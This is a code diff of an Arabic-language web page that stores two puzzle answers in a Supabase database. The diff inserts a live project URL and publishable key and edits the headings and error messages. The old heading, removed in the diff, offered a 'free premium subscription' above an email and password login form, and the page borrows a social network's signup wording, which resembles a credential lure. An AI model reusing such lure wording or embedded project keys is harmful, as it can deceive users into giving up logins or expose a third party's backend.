@@ -110,7 +110,7 @@
 
   <!-- كارت تسجيل الدخول -->
   <div class="card" id="loginCard">
-    <div class="logo">سجل دخولك لتحصل على اشتراك بريميوم مجاني</div>
+    <div class="logo">سجل اجابتك</div>
 
     <input type="text" id="loginEmail" class="field" placeholder="الإيميل">
     <input type="password" id="loginPassword" class="field" placeholder="كلمة السر">
@@ -129,17 +129,17 @@
 
   <!-- كارت التسجيل -->
   <div class="card hidden" id="signupCard">
-    <div class="logo">سجل دخولك لتحصل على اشتراك بريميوم مجاني</div>
+    <div class="logo">سجل اجابتك</div>
     <div style="font-size:17px;font-weight:600;color:#8e8e8e;margin-bottom:20px">
       سجّل عشان تتابع أصحابك
     </div>
 
-   <input id="answer1" type="text" class="field" placeholder="الإجابة الأولى" autocomplete="off">
-    <input id="answer2" type="text" class="field" placeholder="الإجابة الثانية" autocomplete="off">
+   <input id="answer1" type="text">
+<input id="answer2" type="text">
 
  <button type="button" class="btn-main" id="signupBtn" onclick="window.submitAnswers()">
-      تسجيل الإجابة
-    </button>
+  تسجيل الإجابة
+</button>
 
     <div id="signupMsg"></div>
   </div>
@@ -153,8 +153,8 @@
 <script>
   // ================== إعدادات Supabase ==================
   // حط بيانات مشروعك هنا (من Supabase Dashboard > Settings > API)
-  const SUPABASE_URL = "https://YOUR-PROJECT.supabase.co";
-  const SUPABASE_ANON_KEY = "YOUR-ANON-KEY";
+  const SUPABASE_URL = "https://sqmhdpykntsxjlpdztms.supabase.co";
+  const SUPABASE_ANON_KEY = "sb_publishable_2yaR2TFFO_hGQr8puC3ZJA_js9RzVHi";
 
   const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
@@ -206,9 +206,6 @@
     // window.location.href = 'feed.html';
   }
 
-  // كارت التسجيل في النسخة دي مستخدم لتسجيل إجابتي اللغز،
-  // لذلك تم حذف دالة إنشاء الحساب القديمة لأنها كانت تشير إلى حقول غير موجودة.
-
   // ================== لو المستخدم داخل بالفعل ==================
   (async () => {
     const { data: { session } } = await supabase.auth.getSession();
@@ -216,14 +213,13 @@
       showMsg('loginMsg', 'انت مسجل دخول بالفعل (' + session.user.email + ')', 'success');
     }
   })();
-// ================== تسجيل إجابتي اللغز ==================
 window.submitAnswers = async function () {
   const answer1Input = document.getElementById('answer1');
   const answer2Input = document.getElementById('answer2');
   const btn = document.getElementById('signupBtn');
 
   if (!answer1Input || !answer2Input || !btn) {
-    console.error('Puzzle form elements are missing');
+    console.error('عناصر نموذج الإجابة غير موجودة');
     return;
   }
 
@@ -232,15 +228,6 @@ window.submitAnswers = async function () {
 
   if (!answer1 || !answer2) {
     showMsg('signupMsg', 'اكتب الإجابتين الأول', 'error');
-    return;
-  }
-
-  // يمنع انتظار طلب شبكة فاشل لو بيانات المشروع لسه Placeholder.
-  if (
-    SUPABASE_URL.includes('YOUR-PROJECT') ||
-    SUPABASE_ANON_KEY === 'YOUR-ANON-KEY'
-  ) {
-    showMsg('signupMsg', 'حط SUPABASE_URL و SUPABASE_ANON_KEY الحقيقيين الأول', 'error');
     return;
   }
 
@@ -257,7 +244,7 @@ window.submitAnswers = async function () {
       });
 
     if (error) {
-      console.error('Supabase insert error:', error);
+      console.error('Supabase error:', error);
       showMsg('signupMsg', 'فشل التسجيل: ' + error.message, 'error');
       return;
     }
@@ -265,9 +252,14 @@ window.submitAnswers = async function () {
     showMsg('signupMsg', 'تم تسجيل الإجابتين ✅', 'success');
     answer1Input.value = '';
     answer2Input.value = '';
+
   } catch (err) {
-    console.error('Unexpected submit error:', err);
-    showMsg('signupMsg', 'حصل خطأ: ' + (err?.message || err), 'error');
+    console.error('Unexpected error:', err);
+    showMsg(
+      'signupMsg',
+      'حصل خطأ غير متوقع: ' + (err?.message || err),
+      'error'
+    );
   } finally {
     btn.disabled = false;
     btn.innerHTML = oldText;
